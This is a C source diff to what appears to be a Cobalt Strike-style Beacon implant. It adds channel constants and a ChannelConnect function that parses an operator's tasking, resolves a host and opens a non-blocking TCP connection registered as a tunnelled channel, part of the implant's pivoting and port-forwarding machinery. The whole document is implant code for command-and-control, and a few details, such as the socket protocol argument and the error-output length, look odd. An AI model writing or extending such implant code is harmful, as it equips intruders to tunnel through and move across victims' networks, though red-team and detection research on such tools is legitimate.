@@ -20,10 +20,12 @@ typedef struct _CHANNEL_ENTRY
 
 CHANNEL_ENTRY* gChannels;
 
+#define CHANNEL_STATE_0 0
 #define CHANNEL_STATE_1 1
 #define CHANNEL_STATE_2 2
 #define CHANNEL_STATE_3 3
 
+#define CHANNEL_TYPE_CONNECT 0
 #define CHANNEL_TYPE_LISTEN 1
 #define CHANNEL_TYPE_BIND 2
 #define CHANNEL_TYPE_TCP_PIVOT 3
@@ -85,7 +87,7 @@ void ChannelAdd(SOCKET socket, int id, int timeoutPeriod, int type, int port, in
 	
 	for (CHANNEL_ENTRY* ch = gChannels; ch; ch = (CHANNEL_ENTRY*)ch->next)
 		if (ch->id == id)
-			ch->state = 0;
+			ch->state = CHANNEL_STATE_0;
 
 	gChannels = newChannel;
 }
@@ -145,4 +147,50 @@ void ChannelListen(char* buffer, int length)
 	}
 
 	ChannelAdd(sock, id, 180000, CHANNEL_TYPE_LISTEN, port, CHANNEL_STATE_2);
+}
+
+void ChannelConnect(char* buffer, int length)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	int channelId = BeaconDataInt(&parser);
+	short port = BeaconDataShort(&parser);
+
+	int bufferSize = BeaconDataLength(&parser);
+	bufferSize = min(bufferSize, 1024 - 1);
+
+	char* b = BeaconDataBuffer(&parser);
+	memcpy(buffer, b, bufferSize);
+	buffer[bufferSize] = 0;
+
+	NetworkInit();
+
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
+	if (sock == INVALID_SOCKET)
+		goto close;
+
+	HOSTENT* lHostent = gethostbyname(buffer);
+	if (!lHostent)
+		goto close;
+
+	struct sockaddr_in sockaddr;
+	memcpy(&sockaddr.sin_addr, lHostent->h_addr, lHostent->h_length);
+	sockaddr.sin_family = AF_INET;
+	sockaddr.sin_port = htons(port);
+
+	int argp = 1; // 1 = non-blocking
+	if (ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR)
+		goto close;
+
+	if (connect(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR)
+		if (WSAGetLastError() != WSAEWOULDBLOCK)
+			goto close;
+
+	ChannelAdd(sock, channelId, 30000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_2);
+
+	return;
+
+	close:
+	closesocket(sock);
+	BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(channelId));
 }
